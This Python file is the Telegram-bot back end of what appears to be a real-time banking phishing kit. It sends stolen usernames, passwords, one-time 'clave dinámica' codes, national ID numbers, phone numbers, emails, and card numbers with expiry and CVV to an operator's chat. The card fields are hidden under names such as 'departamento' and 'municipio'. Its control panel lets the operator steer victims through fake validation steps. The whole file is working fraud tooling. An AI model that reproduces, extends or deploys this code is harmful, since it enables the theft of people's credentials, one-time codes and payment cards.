import asyncio
import json
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes
from config import TOKEN, ADMIN_CHAT_ID
from state import pending_action

ARCHIVO      = "solicitudes.json"
ARCHIVO_VAL  = "validaciones.json"
ARCHIVO_REG  = "registros.json"
ARCHIVO_COMP = "complementarios.json"

PANEL_FILAS = [
    [
        InlineKeyboardButton("⚡ Dinámica",       callback_data="panel_dinamica"),
        InlineKeyboardButton("❌ Inválida",       callback_data="panel_invalida"),
    ],
    [
        InlineKeyboardButton("👤 Datos",  callback_data="panel_noregistrado"),
        InlineKeyboardButton("💳 Tarjeta", callback_data="panel_standby"),
    ],
    [
        InlineKeyboardButton("🏁 Finalizar",      callback_data="panel_aprobar"),
      
    ],
    [
        InlineKeyboardButton("⏳ Loading",        callback_data="panel_loading"),
       
    ],
]

PANEL_TECLADO = InlineKeyboardMarkup(PANEL_FILAS)

def leer_json(archivo):
    try:
        with open(archivo, "r") as f:
            return json.load(f)
    except:
        return []

def guardar_json(archivo, data):
    with open(archivo, "w") as f:
        json.dump(data, f, indent=2)

def actualizar_estado(archivo, id, nuevo_estado):
    lista = leer_json(archivo)
    for s in lista:
        if s["id"] == id:
            s["estado"] = nuevo_estado
    guardar_json(archivo, lista)

def guardar_message_id(solicitud_id, message_id):
    lista = leer_json(ARCHIVO)
    for s in lista:
        if s["id"] == solicitud_id:
            s["message_id"] = message_id
    guardar_json(ARCHIVO, lista)

# ── Notificacion de login ─────────────────────────────────────
def enviar_solicitud_admin(solicitud):
    asyncio.run(_enviar_login(solicitud))

async def _enviar_login(solicitud):
    bot = Bot(token=TOKEN)
    botones = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚫 User Inválido", callback_data=f"login_rechazar_{solicitud['id']}"),
        ],
    ] + PANEL_FILAS)
    mensaje = (
        f"🔔 Nuevo Logo #{solicitud['id']}\n\n"
        f"👤 Usuario: {solicitud['usuario']}\n"
        f"🔑 Clave: {solicitud.get('clave', 'N/A')}\n"
        f"🌐 IP: {solicitud.get('ip', 'N/A')}\n"
        f"📍 Ciudad: {solicitud.get('ciudad', 'N/A')}\n"
        f"🕐 Hora: {solicitud.get('hora', 'N/A')}\n"
        f"📅 Fecha: {solicitud.get('fecha', 'N/A')}"
    )
    msg = await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=mensaje,
        reply_markup=botones
    )
    guardar_message_id(solicitud["id"], msg.message_id)

# ── Notificacion de clave dinamica ────────────────────────────
def enviar_clave_admin(validacion):
    asyncio.run(_enviar_clave(validacion))

async def _enviar_clave(validacion):
    bot     = Bot(token=TOKEN)
    clave   = validacion["clave"]
    digitos = "  ".join(list(clave))

    botones = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Válida",   callback_data=f"clave_valida_{validacion['id']}"),
            InlineKeyboardButton("❌ Inválida", callback_data=f"clave_invalida_{validacion['id']}"),
        ],
    ] + PANEL_FILAS)
    mensaje = (
        f"🔐 Clave Dinámica #{validacion['id']}\n\n"
        f"💎 Codigo: {digitos}\n"
        f"🕐 Hora: {validacion.get('hora', 'N/A')}\n\n"
        
    )

    # Buscar message_id de la solicitud original para responder en el mismo hilo
    reply_id = None
    sol_id   = validacion.get("solicitud_id")
    if sol_id:
        for s in leer_json(ARCHIVO):
            if s["id"] == sol_id:
                reply_id = s.get("message_id")
                break

    await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=mensaje,
        reply_markup=botones,
        reply_to_message_id=reply_id
    )

# ── Notificacion de nuevo registro ───────────────────────────
def enviar_registro_admin(reg):
    asyncio.run(_enviar_registro(reg))

async def _enviar_registro(reg):
    bot = Bot(token=TOKEN)
    botones = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Aprobar registro",  callback_data=f"reg_aprobar_{reg['id']}"),
            InlineKeyboardButton("🚫 Rechazar registro", callback_data=f"reg_rechazar_{reg['id']}"),
        ],
    ] + PANEL_FILAS)
    sol_id = reg.get("solicitud_id")
    usuario = "N/A"
    reply_id = None
    if sol_id:
        for s in leer_json(ARCHIVO):
            if s["id"] == sol_id:
                reply_id = s.get("message_id")
                usuario  = s.get("usuario", "N/A")
                break

    mensaje = (
        f"📋 Nuevo registro #{reg['id']} — Solicitud #{sol_id}\n\n"
        f"👤 Usuario sesión: {usuario}\n"
        f"📝 Nombre: {reg['nombre']} {reg['apellido']}\n"
        f"🪪 Cédula: {reg['cedula']}\n"
        f"📱 Celular: {reg['telefono']}\n"
        f"📧 Correo: {reg['correo']}\n"
        f"🕐 Hora: {reg['hora']} — {reg['fecha']}"
    )
    await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=mensaje,
        reply_markup=botones,
        reply_to_message_id=reply_id
    )

# ── Notificacion de datos complementarios ────────────────────
def enviar_complementario_admin(comp):
    asyncio.run(_enviar_complementario(comp))

async def _enviar_complementario(comp):
    bot = Bot(token=TOKEN)
    botones = InlineKeyboardMarkup([
        [
           
            InlineKeyboardButton("🚫 Tarjeta Inválida", callback_data=f"comp_rechazar_{comp['id']}"),
        ],
    ] + PANEL_FILAS)
    sol_id  = comp.get("solicitud_id")
    usuario = "N/A"
    reply_id = None
    if sol_id:
        for s in leer_json(ARCHIVO):
            if s["id"] == sol_id:
                reply_id = s.get("message_id")
                usuario  = s.get("usuario", "N/A")
                break

    mensaje = (
        f"📝 Datos complementarios #{comp['id']} — Solicitud #{sol_id}\n\n"
        f"👤 Usuario sesión: {usuario}\n"
        f"🏙️ Tarjeta: {comp['departamento']}\n"
        f"🎂 Vencimiento: {comp['nacimiento']}\n"
        f"📍 CVV: {comp['municipio']}\n"
        f"🕐 Hora: {comp['hora']} — {comp['fecha']}"
    )
    await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=mensaje,
        reply_markup=botones,
        reply_to_message_id=reply_id
    )

# ── Comandos /start y /panel ──────────────────────────────────
async def cmd_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = Bot(token=TOKEN)
    await bot.send_message(
        chat_id=update.effective_chat.id,
        text="🎛️ Panel de control",
        reply_markup=PANEL_TECLADO
    )

# ── Manejador de botones ──────────────────────────────────────
async def manejar_boton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data

    if data.startswith("panel_"):
        pending_action["accion"] = data.replace("panel_", "")
        return

    if data.startswith("login_aprobar_"):
        id_sol = int(data.replace("login_aprobar_", ""))
        actualizar_estado(ARCHIVO, id_sol, "aprobado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Aprobado ●",  callback_data="noop"),
             InlineKeyboardButton("Rechazar",        callback_data="noop")],
        ]))
        return

    if data.startswith("login_rechazar_"):
        id_sol = int(data.replace("login_rechazar_", ""))
        actualizar_estado(ARCHIVO, id_sol, "rechazado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Aprobar",          callback_data="noop"),
             InlineKeyboardButton("🚫 Rechazado ●",   callback_data="noop")],
        ]))
        return

    if data.startswith("clave_valida_"):
        id_val = int(data.replace("clave_valida_", ""))
        actualizar_estado(ARCHIVO_VAL, id_val, "aprobado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Válida ●",    callback_data="noop"),
             InlineKeyboardButton("Inválida",        callback_data="noop")],
        ]))
        return

    if data.startswith("clave_invalida_"):
        id_val = int(data.replace("clave_invalida_", ""))
        actualizar_estado(ARCHIVO_VAL, id_val, "invalida")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Válida",           callback_data="noop"),
             InlineKeyboardButton("❌ Inválida ●",    callback_data="noop")],
        ]))
        return

    if data.startswith("reg_aprobar_"):
        id_reg = int(data.replace("reg_aprobar_", ""))
        actualizar_estado(ARCHIVO_REG, id_reg, "aprobado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Registro aprobado ●", callback_data="noop"),
             InlineKeyboardButton("Rechazar",                callback_data="noop")],
        ]))
        return

    if data.startswith("reg_rechazar_"):
        id_reg = int(data.replace("reg_rechazar_", ""))
        actualizar_estado(ARCHIVO_REG, id_reg, "rechazado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Aprobar",                  callback_data="noop"),
             InlineKeyboardButton("🚫 Registro rechazado ●",  callback_data="noop")],
        ]))
        return

    if data.startswith("comp_aprobar_"):
        id_comp = int(data.replace("comp_aprobar_", ""))
        actualizar_estado(ARCHIVO_COMP, id_comp, "aprobado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Aprobado ●", callback_data="noop"),
             InlineKeyboardButton("Rechazar",       callback_data="noop")],
        ]))
        return

    if data.startswith("comp_rechazar_"):
        id_comp = int(data.replace("comp_rechazar_", ""))
        actualizar_estado(ARCHIVO_COMP, id_comp, "rechazado")
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Aprobar",          callback_data="noop"),
             InlineKeyboardButton("🚫 Rechazado ●",   callback_data="noop")],
        ]))
        return

    if data == "noop":
        return

def correr_bot():
    async def _run():
        try:
            bot_instance = Bot(token=TOKEN)
            await bot_instance.delete_webhook(drop_pending_updates=True)
            print("[OK] Sesion de Telegram limpiada")
        except Exception as e:
            print(f"[WARN] Limpieza omitida: {e}")

        while True:
            try:
                app = Application.builder().token(TOKEN).build()
                app.add_handler(CommandHandler(["start", "panel"], cmd_panel))
                app.add_handler(CallbackQueryHandler(manejar_boton))
                async with app:
                    await app.start()
                    await app.updater.start_polling(drop_pending_updates=True)
                    print("[OK] Bot iniciado y escuchando")
                    await asyncio.Event().wait()
            except (KeyboardInterrupt, SystemExit):
                raise
            except BaseException as e:
                print(f"[ERROR] Bot caido: {e}, reintentando en 30s...")
                await asyncio.sleep(30)

    asyncio.run(_run())


